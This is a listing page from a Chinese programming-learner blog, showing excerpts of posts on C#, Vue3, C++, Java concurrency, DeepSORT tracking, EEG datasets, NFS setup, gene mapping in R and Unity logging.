<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="IT学习者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="IT学习者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aed061c507e7f9babe7a7674782cfab5/" rel="bookmark">
			“Nullable object must have a value.” :“Object reference not set to an instance of an object.”
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.System.InvalidOperationException:“Nullable object must have a value.” 介于这种情况，通常是：我们定义的数据类型允许为null时，又用它进行赋值所导致的！如：
public int? Id { get; set; }
public decimal? Price { get; set; }
解决方案：
1.在进行赋值之前确保，赋值对象已经存在值，即：非null；
2.若无法确保是否存在值，给予一个默认值，即可；
2.System.NullReferenceException:“Object reference not set to an instance of an object.” 而这种情况，通常则是：我们查询数据的时候，返回的对象为null,其属性值，如：ID、NO…，我们需要使用其属性值导致的！
解决方案：
1.三元表达式
2.简单封装复用
//三元表达式 var product = GetAll().Where(a =&gt; a.No == "FYCJ0001").FirstOrDefault() == null ? null : GetAll().Where(a =&gt; a.No == "FYCJ0001").FirstOrDefault(); string name = product == null ? null : product.Name; static void Main(string[] args) { //封装处理 Product product = GetAll().
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aed061c507e7f9babe7a7674782cfab5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/52dcbe361b3083fe3bf7e86bff10430f/" rel="bookmark">
			vue3中computed计算属性函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		写在前面 目标：现在vue3的使用越来越普遍了，vue3这方面的学习我们要赶上，今天说一下vue3中computed计算属性的使用。
computed函数在vue2中我们都了解过，当我们需要一个值，这个值随着其他值变化而变化，我们就将其放进computed中，computed是用来定义计算属性的。
1. 基本使用：只读 &lt;template&gt; &lt;div&gt; &lt;div&gt;计算属性&lt;/div&gt; &lt;hr&gt; &lt;button @click='age=25'&gt;点击&lt;/button&gt; &lt;div&gt;今年：{{age}}岁了&lt;/div&gt; &lt;div&gt;明年：{{nextAge}}岁了&lt;/div&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; import { ref, computed } from 'vue' export default { name: 'App', setup () { // 计算属性：简化模板 // 应用场景：基于已有的数据，计算一种数据 const age = ref(18) // 计算属性基本使用 const nextAge = computed(() =&gt; { // 回调函数必须return，结果就是计算的结果 // 如果计算属性依赖的数据发生变化，那么会重新计算 return age.value + 1 }) return { age, nextAge } } } &lt;/script&gt; &lt;style lang="less"&gt; &lt;/style&gt; 总结：Vue3中计算属性也是组合API风格
回调函数必须return，结果就是计算的结果如果计算属性依赖的数据发生变化，那么会重新计算不要在计算中中进行异步操作 2 高级用法：可读可写 &lt;template&gt; &lt;div&gt; &lt;div&gt;计算属性&lt;/div&gt; &lt;hr&gt; &lt;button @click='age=25'&gt;点击&lt;/button&gt; &lt;button @click='nextAge=28'&gt;点击修改&lt;/button&gt; &lt;div&gt;今年：{{age}}岁了&lt;/div&gt; &lt;div&gt;明年：{{nextAge}}岁了&lt;/div&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; import { ref, computed } from 'vue' export default { name: 'App', setup () { // 计算属性：简化模板 // 应用场景：基于已有的数据，计算一种数据 const age = ref(18) // // 计算属性基本使用 // const nextAge = computed(() =&gt; { // // 回调函数必须return，结果就是计算的结果 // // 如果计算属性依赖的数据发生变化，那么会重新计算 // return age.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/52dcbe361b3083fe3bf7e86bff10430f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0237199a62949265ed2b626793fa7d92/" rel="bookmark">
			运算符优先级（c&#43;&#43;）（1~8级）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		接上篇：逻辑或、与、非、或非、与非、异或、同或运算 在c++中，运算符有一定的优先级。就像数学中的（）、+、-、*、/ 等符号。我们知道，数学中的括号为第一优先级，其次是*、/，然后是+、-。那么：
How about c++？（部分运算符） 第一级别：作用域解析符：“::”。举例：
Class::age = 2; 第二级别：
1.函数调用符： （） 。举例：
int b=-3; abs(b); 2.后自增运算符/后自减运算符： ++ /-- ：最明显的就是在for循环中：
//后自增运算符： for(int i=1;i&lt;=100;i++){ cout&lt;&lt;"QAQ"&lt;&lt;endl; } //后自减运算符： for(int i=100;i&gt;=1;i--){ cout&lt;&lt;"QAQ"&lt;&lt;endl; } 第三级别：
1.逻辑取反：‘ ! ’。举例：
int n,k; if(k==n){ cout&lt;&lt;QAQ"&lt;&lt;endl; } 2.按位取反：' ~ '。见上篇。
3.正负号： + - 。不多赘述。
第四级别：类指针成员引用/类对象成员引用： “ -&gt;* ” / “ .* ”。
第五级别：即乘、除法及取模运算。
第六级别：加减法运算。
第七级别：位左移、右移：'&lt;&lt; ' 、' &gt;&gt; '。
//位左移： int flag=10086&lt;&lt;2; //位右移： int flag=10086&gt;&gt;2; 第八级别：小于、小于等于；大于、大于等于。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0237199a62949265ed2b626793fa7d92/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3e1494dc246610942b889c6e48e4504d/" rel="bookmark">
			EEG 数据集整理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MI BCI II dataset Ia: 任务：确定受试者是试图产生皮质消极性还是皮质积极性
特点：
多标记标签数维度/通道数多源小样本数据规模时长N26NY268 train; 293 test3.5s Birbaumer, N., Flor, H., Ghanayim, N., Hinterberger, T., Iverson, I., Taub, E., Kotchoubey, B., Kübler, A., &amp; Perelmouter, J, A Brain-Controlled Spelling Device for the Completely Paralyzed, Nature, 398, 297-298. BCI II dataset Ib: 任务：确定受试者是试图产生皮质消极性还是皮质积极性
特点：
多标记标签数维度/通道数多源小样本数据规模时长N27NY200 train; 180 test4.5s Birbaumer, N., Flor, H., Ghanayim, N., Hinterberger, T., Iverson, I., Taub, E., Kotchoubey, B., Kübler, A., &amp; Perelmouter, J, A Brain-Controlled Spelling Device for the Completely Paralyzed, Nature, 398, 297-298.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3e1494dc246610942b889c6e48e4504d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e19f5c0e414908c32fc01de5923bca16/" rel="bookmark">
			目标追踪---deepsort原理讲解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、多目标追踪的主要步骤
二、sort流程
三、Deepsort算法流程
一、多目标追踪的主要步骤 获取原始视频帧利用目标检测器对视频帧中的目标进行检测将检测到的目标的框中的特征提取出来，该特征包括表观特征（方便特征对比避免ID switch）和运动特征（运动特征方便卡尔曼滤波对其进行预测）计算前后两帧目标之前的匹配程度（利用匈牙利算法和级联匹配），为每个追踪到的目标分配ID。 二、sort流程 Deepsort的前身是sort算法，sort算法的核心是卡尔曼滤波算法和匈牙利算法。
卡尔曼滤波算法作用：该算法的主要作用就是当前的一系列运动变量去预测下一时刻的运动变量，但是第一次的检测结果用来初始化卡尔曼滤波的运动变量。
匈牙利算法的作用：简单来讲就是解决分配问题，就是把一群检测框和卡尔曼预测的框做分配，让卡尔曼预测的框找到和自己最匹配的检测框，达到追踪的效果。
sort工作流程如下图所示：
Detections是通过目标检测到的框框。Tracks是轨迹信息。
整个算法的工作流程如下：
（1）将第一帧检测到的结果创建其对应的Tracks。将卡尔曼滤波的运动变量初始化，通过卡尔曼滤波预测其对应的框框。
（2）将该帧目标检测的框框和上一帧通过Tracks预测的框框一一进行IOU匹配，再通过IOU匹配的结果计算其代价矩阵（cost matrix，其计算方式是1-IOU）。
（3）将（2）中得到的所有的代价矩阵作为匈牙利算法的输入，得到线性的匹配的结果，这时候我们得到的结果有三种，第一种是Tracks失配（Unmatched Tracks），我们直接将失配的Tracks删除；第二种是Detections失配（Unmatched Detections），我们将这样的Detections初始化为一个新的Tracks（new Tracks）；第三种是检测框和预测的框框配对成功，这说明我们前一帧和后一帧追踪成功，将其对应的Detections通过卡尔曼滤波更新其对应的Tracks变量。
（4）反复循环（2）-（3）步骤，直到视频帧结束。
三、Deepsort算法流程 由于sort算法还是比较粗糙的追踪算法，当物体发生遮挡的时候，特别容易丢失自己的ID。而Deepsort算法在sort算法的基础上增加了级联匹配（Matching Cascade）和新轨迹的确认（confirmed）。Tracks分为确认态（confirmed），和不确认态（unconfirmed），新产生的Tracks是不确认态的；不确认态的Tracks必须要和Detections连续匹配一定的次数（默认是3）才可以转化成确认态。确认态的Tracks必须和Detections连续失配一定次数（默认30次），才会被删除。
Deepsort算法的工作流程如下图所示：
整个算法的工作流程如下：
（1）将第一帧次检测到的结果创建其对应的Tracks。将卡尔曼滤波的运动变量初始化，通过卡尔曼滤波预测其对应的框框。这时候的Tracks一定是unconfirmed的。
（2）将该帧目标检测的框框和第上一帧通过Tracks预测的框框一一进行IOU匹配，再通过IOU匹配的结果计算其代价矩阵（cost matrix，其计算方式是1-IOU）。
（3）将（2）中得到的所有的代价矩阵作为匈牙利算法的输入，得到线性的匹配的结果，这时候我们得到的结果有三种，第一种是Tracks失配（Unmatched Tracks），我们直接将失配的Tracks（因为这个Tracks是不确定态了，如果是确定态的话则要连续达到一定的次数（默认30次）才可以删除）删除；第二种是Detections失配（Unmatched Detections），我们将这样的Detections初始化为一个新的Tracks（new Tracks）；第三种是检测框和预测的框框配对成功，这说明我们前一帧和后一帧追踪成功，将其对应的Detections通过卡尔曼滤波更新其对应的Tracks变量。
（4）反复循环（2）-（3）步骤，直到出现确认态（confirmed）的Tracks或者视频帧结束。
（5）通过卡尔曼滤波预测其确认态的Tracks和不确认态的Tracks对应的框框。将确认态的Tracks的框框和是Detections进行级联匹配（之前每次只要Tracks匹配上都会保存Detections其的外观特征和运动信息，默认保存前100帧，利用外观特征和运动信息和Detections进行级联匹配,这么做是因为确认态（confirmed）的Tracks和Detections匹配的可能性更大）。
（6）进行级联匹配后有三种可能的结果。第一种，Tracks匹配，这样的Tracks通过卡尔曼滤波更新其对应的Tracks变量。第二第三种是Detections和Tracks失配，这时将之前的不确认状态的Tracks和失配的Tracks一起和Unmatched Detections一一进行IOU匹配，再通过IOU匹配的结果计算其代价矩阵（cost matrix，其计算方式是1-IOU）。
（7）将（6）中得到的所有的代价矩阵作为匈牙利算法的输入，得到线性的匹配的结果，这时候我们得到的结果有三种，第一种是Tracks失配（Unmatched Tracks），我们直接将失配的Tracks（因为这个Tracks是不确定态了，如果是确定态的话则要连续达到一定的次数（默认30次）才可以删除）删除；第二种是Detections失配（Unmatched Detections），我们将这样的Detections初始化为一个新的Tracks（new Tracks）；第三种是检测框和预测的框框配对成功，这说明我们前一帧和后一帧追踪成功，将其对应的Detections通过卡尔曼滤波更新其对应的Tracks变量。
（8）反复循环（5）-（7）步骤，直到视频帧结束。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e9372f00d3a968e68278d18559844078/" rel="bookmark">
			2021 年全球最受欢迎的 11 个 Node.js 框架
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2021 年全球最受欢迎的 11 个 Node.js 框架 在我们看到 2021 年最佳 Node.js 框架之前，让我们先谈谈 Node 及其在编程中的作用。
Node.js 是一个开源的 JavaScript 运行时。换句话说，一个在浏览器之外运行 JavaScript 的执行环境，就像任何编程语言一样。
这是一场革命，允许将世界上最著名的语言之一 (JavaScript) 用于客户端和服务器端脚本编程。
自 2009 年诞生以来，Node.js 的受欢迎程度一直在稳步上升。随着 Node 开发人员活跃社区的发展，编程需求和解决它们的解决方案成倍增加。并且这些解决方案已经整合到框架中。 所以我们来到了 2021 年，最好的 Node 框架列表......
让我们开始！
Express Express是开发人员中最流行的 Node 框架之一。它是一个高度灵活的动态框架，允许开发人员自定义应用程序。它非常轻，因此速度也非常快。它为 MVC 模式、不同的模板引擎、增加其功能的插件和扩展提供支持。
Express 用于开发所有级别的 Web 和移动应用程序。
Express 在客户端和服务器之间的出色通信为用户提供了高级别的体验，这也是 Twitter、优步、埃森哲和 IBM 等公司使用 Express 的原因。
由于强大的路由、安全和错误处理功能，它还可以用于企业级应用程序。
下一个框架是 Koa.js。它被誉为下一代 Node.js 框架，让我们看看它为现代应用程序开发提供了什么！
KOA koa由 Express 相同的开发人员团队创建，Koa是一个服务器端 NodeJS 框架，最近但由于它允许获得的出色结果而迅速扩展。Koa 允许使用限制回调的生成器。这反过来为开发人员提供了更好的错误处理。它还利用了 ES2017 异步。
Koa 允许您非常有效地管理页面个性化，在单个 URL 内提供个性化内容。事实上，它管理内容的翻译、针对用户的个性化、支持不同的图像格式等。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e9372f00d3a968e68278d18559844078/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/53465f1c7558f89fafbbb5904e3ef87c/" rel="bookmark">
			Vue实现上下左右无缝滚动,鼠标移入并暂停
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		需求:超过4条数据就开始无限循环滚动
在线文档:https://chenxuan1993.gitee.io
使用vue-seamless-scroll组件步骤:
一:安装 npm install vue-seamless-scroll --save 二:在用到的页面引入和注册组件 &lt;script&gt; import vueSeamlessScroll from "vue-seamless-scroll"; export default { name: "test-abnormal-dynamics", components:{vueSeamlessScroll}, } &lt;/script&gt; 三:使用组件 &lt;vueSeamlessScroll :data="noticeList" class="seamless-warp" :class-option="optionCustomer"&gt; &lt;ul class="item"&gt; &lt;li v-for="item in noticeList"&gt; 这里写自己要渲染的内容及样式 &lt;/li&gt; &lt;/ul&gt; &lt;/vueSeamlessScroll&gt; 四:属性设置,滚动速度，滚动方向，开始滚动的条数，每次滚动的条数 &lt;script&gt; import vueSeamlessScroll from "vue-seamless-scroll"; export default { name: "test-abnormal-dynamics", components:{vueSeamlessScroll}, data() { return { optionCustomer: { step: 1, limitMoveNum: 5,//限制开始滚动的条数 openTouch: false, waitTime: 50,//滚动的速度 direction: 1, //方向 0 往下 1 往上 2向左 3向右 singleWidth: 30, }, }; }, } &lt;script&gt; 注：我最开始使用的时候就是 没有设置参数，而我的数据又比较少，就没有滚动效果，因为limitMoveNum 的默认条数是5，也就是当数组长度大于等于5的时候才触发滚动~
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/53465f1c7558f89fafbbb5904e3ef87c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5e6b99c607a832edca17a5fc2e44dd0b/" rel="bookmark">
			迅为IMX6ULL开发板NFS服务器的搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于迅为IMX6ULL开发板
(1)在 ubuntu 安装 nfs 服务：在管理员的身份下运行
apt-get install nfs-kernel-server
(2) 在/home 下创建一个名为 nfs 的文件夹
3
(3) 打开配置文件添加 nfs 共享目录
vi /etc/exports
在配置文件里面添加一下代码：
/home/nfs/ *(rw,sync,no_root_squash)
其中： /home/nfs/ 是 nfs 服务器要共享的目录
rw:是可读写权限
sync:是资料同步写入内存和硬盘
no_root_squash:当登录 NFS 主机使用共享目录的使用者是 root 时，其权限将被转换成为一名使用者，
通常它的 UID 与 GID 都会变成 nobody 身份。
（4）重启 nfs 服务
/etc/init.d/nfs-kernel-server restart
IMX6ULL开发板接口：
核心板参数
尺寸：38mm*42mm
PCB：6层
CPU：iMX6ULL ARM Cortex-A7架构 单核
iMX6ULL 商业级 内存：512M 存储：8G EMMC
iMX6ULL 工业级 内存：256M 存储：512M FLASH 工作电压：5V~16V 电压供电
系统支持：Linux-QT系统；Ubuntu core系统；Youcto系统；Buildroot系统；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5e6b99c607a832edca17a5fc2e44dd0b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/39156286f35e1f001dc6d51429e64891/" rel="bookmark">
			逻辑或、与、非、或非、与非、异或、同或运算
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		注：这七个运算均为二进制下的运算。 1.或：运算符 ' | ' 。若两个条件一个成立，则此运算为“真”。 即：0|1=1, 0|0=0, 1|1=1（此中一个为1，则全为1；否则为0） 2.与：运算符 ' &amp; ' 。只有两个条件同时成立，此运算才为“真”。 即：0&amp;1=0, 0&amp;0=0, 1&amp;1=1（此中一个为0，则全为0；否则为1） 3.非：运算符 ' ~ ' 。只有条件为“假”，此运算才为“真”。 即 10001101001进行“非”运算，结果为： 01110010110=01110010110 4.异或：运算符 ' ^ ' 。只有条件不同时，此运算才为“真”。 即：0|1=1, 0|0=0, 1|1=0（此中不同为1；否则为0） 5.同或：运算符 ' ⊙ '（圆内加一点）。只有条件相同时，此运算才为“真” 。 即：0|1=0, 0|0=1, 1|1=1（此中相同为1；否则为0） 6.或非：对“或”运算的结果取反（即非运算）。 7.与非：对“与”运算的结果取反（即非运算）。 接下篇：运算符优先级（c++）（1~8级）https://blog.csdn.net/qi_programmer/article/details/120265080https://blog.csdn.net/qi_programmer/article/details/120265080
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/15ede2331af7340590fb4fb580fa090f/" rel="bookmark">
			相机响应曲线计算（Debeve and Malik）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.背景 相机的灰度值与实际辐照度值的关系不成线性关系，因此需要进行预标定。
2.算法（Debeve and Malik） 图片引自知乎文章，横坐标表示曝光度ln（E*t），因为辐照度E不知道，所以假设为1，纵坐标表示像素值灰度百分比，曲线表示一个像素在不同曝光时间下的变化。上述曲线假设辐照度E都为1，所有这几条曲线没有重合，但理论上这几条曲线应该重合在一起，因此如果获取到这些像素的真实辐照度，即将这些曲线左右平移,表示ln(Et)=ln(E)+LN(1t)，重合在一起，即可得到真实照度与像素灰度值关系。因为曲线重合在一起后会有多个结果，为了消除全局偏移不确定性，可以将中间强度的像素值的曝光度置为0进行确定。
上述移动的本质其实就是求解实际辐照度，具体推导思路如下所示。
其中Z表示像素灰度值，i表示像素序号，j表示曝光时间序号， Z i j Z_{ij} Zij​表示曝光时间为 △ t \triangle t △t时第i个像素的灰度值；E表示辐照度；f表示转换函数。可以推导为
g表示转换函数，将像素强度转变为曝光度ln（E*t）。
通过上述公式，可以知道要想总曲线达到最佳重合，可以列出公式
其中O为需要最小化的能量函数。前面一项为函数的最小二乘误差，后一项表示曲线的光滑度，越小表示曲线越光滑，其中 λ \lambda λ表示光滑因子。由于像素灰度值在中间范围时较为可靠，因此可以考虑添加权重函数 ω \omega ω，表示为
则能量函数可转换为
这一公式中需要求解的未知数为256+N个（256表示g函数的一一对应，N表示N个像素点的辐照度），可以列出的方程为NP个，同时由于上述将中间灰度值的辐照度置为0，则只要满足256+P ≤ \leq ≤NP+1即可进行解算。
3.matlab代码 相关求解代码如下
function [g,lE]=gsolve(Z,B,l) % Given a set of pixel values observed for several pixels in several % images with different exposure times, this function returns the % imaging system誷 response function g as well as the log film irradiance % values for the observed pixels.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/15ede2331af7340590fb4fb580fa090f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3d976fb26c9692b49723a6a26cfaa31d/" rel="bookmark">
			Java异步编排 2021-09-11
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java 异步并发与池化技术 异步编排 Java 异步并发与池化技术一、什么是异步调用二 Future接口三、异步开启四、CompletableFuture接口实现异步编排4.1串行关系执行4.1.1 串行关系方法4.1.2 代码使用示例 4.2聚合关系 AND4.3聚合关系 OR4.4 异常处理 一、什么是异步调用 异步调用实现一个不需要被等待的方法的返回值；让调用者（主线程）继续执行（异步执行）；在 java 中，简单的讲就是开启另一个线程完成程序计算（子线程），使得调用者（主线程）继续执行，不需要等待计算的结果，但是调用者任然需要获取线程的计算结果（不需要同步阻塞等待）。调用后无需等待，任务交给子线程，主线程继续执行。
二 Future接口 Future 也是一个异步计算结果返回接口，目的获取返回值结果。但是 future 在获取返回值结果的时候，方法必须同步阻塞等待返回值结果。
Get : 获取结果（等待，阻塞）Get(timeout) : 获取结果，指定等待时间Cancel : 取消当前任务isDone : 判断任务是否已经完成 （轮询） 结论： futrure 对于结果获取不是很方便，只能通过同步阻塞的方式获取结果，或者是轮询的方式获取到结果；阻塞的方式获取返回值结果与异步的思想想违背，轮询方式又很占用 cpu 资源，也不能及时得到我们结果。
三、异步开启 CompletableFuture 提供了 4 个静态的方法，来创建一个异步操作（异步开启： 从这 4 个静态的方法开发即可）
runAsync: 没有返回值的方法，不关注返回值 public static CompletableFuture&lt;Void&gt; runAsync(Runnable runnable); public static CompletableFuture&lt;Void&gt; runAsync(Runnable runnable,Executor executor); supplyAsync : 有返回值，关注返回值的。 public static &lt;U&gt; CompletableFuture&lt;U&gt; supplyAsync(Supplier&lt;U&gt; supplier); public static &lt;U&gt; CompletableFuture&lt;U&gt; supplyAsync(Supplier&lt;U&gt; supplier,Executor executor) 代码示例：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3d976fb26c9692b49723a6a26cfaa31d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f85fe3037c7f17b352e3857b7cbe6bed/" rel="bookmark">
			人鼠基因同源转换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		工具：R语言biomaRt包
生物学背景：同源，最基本的意义就是具有共同祖先。当然这里不是说人和鼠有相同的祖先，我们这里的分子水平的同源性。从分子水平讲则是指两个核酸分子的核苷酸序列或两个蛋白质分子的氨基酸序列间的相似程度，那我们就说二者同源，就是说可以相互转化的基因具有一定的序列相似性，那么二者的基因便可以成为同源基因。许多不同的物种间都具有同源性。现代分子生物学中的同源性描述的是基因与基因之间相似关系，它表明的是两个相比较的序列之间的匹配程度。一般来说，如果两条基因序列相似性达80% ，就可以把它们称为“同源基因(homologousgene)”。
安装biomaRt包 install.packages("BiocManager") BiocManager::install("biomaRt") 选择目标数据库和数据集（人和小鼠） library(biomaRt) human=useMart("ensembl",dataset="hsapiens_gene_ensembl") class(human) mouse=useMart("ensembl",dataset="mmusculus_gene_ensembl") class(mouse) #useMart一般跟两个参数，第一个借助ensemble数据库，第二个参数是选择的物种数据集
构造测试基因集 genes=c("Tmx2","Trp53","Zfp286") 小鼠基因同源映射到人 genes=getLDS(attributes=c("mgi_symbol"),filters="mgi_symbol", values=genes,mart=mouse, attributesL=c("hgnc_symbol","chromosome_name","start_position","end_position"), martL=human, uniqueRows=T) #attributes指所要检索数据集的属性参数,可用listAttributes函数检索属性列表
#values指构造的数据集（即输入的数据集）
#mart指输入数据的对象（如mouse）
#attributesL指需要转化的目标数据集
#martL指输出的对象（如human）
结果如下
写一个简单的封装函数并测试 transMG&lt;-function(x){ require("biomaRt") human=useMart("ensembl",dataset="hsapiens_gene_ensembl") mouse=useMart("ensembl",dataset="mmusculus_gene_ensembl") gs=getLDS(attributes=c("mgi_symbol"),filters="mgi_symbol", values=x,mart=mouse, attributesL=c("hgnc_symbol"),martL=human,uniqueRows=T) return(gs)	} transMG(genes) 结果如下
人转小鼠基因同理 genes1=c("TMX2","TP53","ZNF286A","EGF") transHG&lt;-function(x){ require("biomaRt") human=useMart("ensembl",dataset="hsapiens_gene_ensembl") mouse=useMart("ensembl",dataset="mmusculus_gene_ensembl") gs1=getLDS(attributes=c("hgnc_symbol"),filters="hgnc_symbol", values=x,mart=human, attributesL=c("mgi_symbol"),martL=mouse,uniqueRows=T) return(gs1)	} transHG(genes1) 结果如下
以上，就是跨物种基因同源转换的方法之一，biomaRt包用起来真的很方便，不过在转换的时候可能会出现一对多的现象。
参考：https://www.jianshu.com/p/96039fc8f4eb
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1a148c8f3628252edefeacb5826001fa/" rel="bookmark">
			【工具介绍】fastcopy的下载与使用方法，可用于硬盘对拷
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 介绍 fastcopy是windows平台用于快速复制或移动文件的工具。按博主的使用来看，fastcopy很适合用于硬盘对拷和大文件夹的移动，速度比windows自动复制移动要快的多，比diskgenius的分区克隆也要快。
下载方法 官方网址：https://fastcopy.jp/
如果希望使用汉化版可以在百度搜索
工具使用 一般使用只要明白以下几个参数即可：
Source：源文件(夹)，就是你想复制的东西DestDir：目标文件(夹)，就是你想复制到哪Diff、Copy、Move、Sync、Delete all diff：复制，有不同策略，一般默认(Size/Date)copy：复制，并且覆盖同名文件move：剪切 Buffer(MB)：缓存大小，内存充足的情况512MB能比较快速Full Speed：速度，默认满速Nonstop：复制时不会息屏Verify：数据检验，对于重要文件建议开启，也影响不了多少速度Estimate：时间估计Execute：执行复制或移动 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/59f54a4d4259acd21b79425ea5398666/" rel="bookmark">
			【编辑器】将Unity的log全部生成到本地
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 用Unity的Log窗口看日志比较麻烦，要不只能查关键词，要不只能看上下文。所以将log都生成到本地，然后自己搜索就最好了。
效果 实现 #if UNITY_EDITOR using System; using System.IO; using System.Reflection; using System.Text; using UnityEditor; using UnityEngine; public class UnityOutputLogHelper { private class UnityOutputLogHelperWindow : EditorWindow { private static UnityOutputLogHelperWindow m_Instance; [MenuItem("UnityLog输出/输出")] private static void Open() { if (m_Instance != null) { EditorWindow.DestroyImmediate(m_Instance); } m_Instance = EditorWindow.GetWindow&lt;UnityOutputLogHelperWindow&gt;("UnityLog输出"); } private UnityOutputLogHelper m_UnityOutputLogHelper; private void OnEnable() { m_Instance = this; m_UnityOutputLogHelper = new UnityOutputLogHelper(); m_UnityOutputLogHelper.Init(); } private void OnDestroy() { m_UnityOutputLogHelper.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/59f54a4d4259acd21b79425ea5398666/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6ba2da9075846005223fa59d1f4d99b1/" rel="bookmark">
			java停止Thread方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		java停止线程的方法 停止一个线程通常意味着在线程处理任务完成之前停掉正在做的操作，也就是放弃当前的操作。
在 Java 中有以下 3 种方法可以终止正在运行的线程：
线程正常退出，也就是当 run() 方法完成后自动退出。
使用 stop() 方法强行终止线程，但是不推荐使用这个方法，该方法已被弃用。
使用 interrupt 方法中断线程。
一、线程正常执行完毕后线程自动退出 二、使用stop()退出 在java中的Thread类中提供了一系列方法 start()、stop()、resume()、suspend()、destory()等方法来管理线程，除了start()其它方法都已经过时
jdk中有一个文档专门解释为什么弃用这些方法：https://docs.oracle.com/javase/1.5.0/docs/guide/misc/threadPrimitiveDeprecation.html
为什么停止使用stop方法？
1、stop()它本质上是不安全的。停止线程会使其解锁所有已锁定的监视器
2、调用 stop() 方法会立刻停止 run() 方法中剩余的全部工作，包括在 catch 或 finally 语句中的，并抛出ThreadDeath异常(通常情况下此异常不需要显示的捕获)，因此可能会导致一些清理性的工作的得不到完成，如文件，数据库等的关闭
3、调用 stop() 方法会立即释放该线程所持有的所有的锁，导致数据得不到同步，出现数据不一致的问题。
三、使用interrupt()退出 使用stop方法停止线程不安全，运行时停止线程，只能使用interrupt()；
注意：interrupt()并不是马上停止线程，而是仅仅给这个线程打一个停止标记，需要使用isInterrupted()来判断线程是否中断；
